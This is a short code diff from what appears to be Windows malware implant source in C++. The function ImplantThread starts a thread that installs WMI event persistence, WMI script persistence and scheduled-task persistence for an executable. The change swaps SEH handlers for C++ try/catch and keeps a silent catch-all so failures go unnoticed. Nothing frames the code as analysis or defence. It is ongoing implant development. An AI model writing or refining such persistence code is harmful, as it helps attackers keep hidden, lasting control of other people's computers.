@@ -105,14 +105,14 @@ DWORD WINAPI ImplantThread(LPVOID) {
     wcscpy_s(ctx->path, exePath);
     CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
         auto* c = static_cast<PersistCtx*>(p);
-        __try {
+        try {
             if (!IsWmiPersistenceInstalled()) {
                 InstallWmiPersistence(c->path);
                 InstallWmiScriptPersistence(c->path);
             }
             if (!IsScheduledTaskInstalled())
                 InstallScheduledTaskPersistence(c->path);
-        } __except(EXCEPTION_EXECUTE_HANDLER) {}
+        } catch(...) {}
         delete c;
         return 0;
     }, ctx, 0, nullptr);
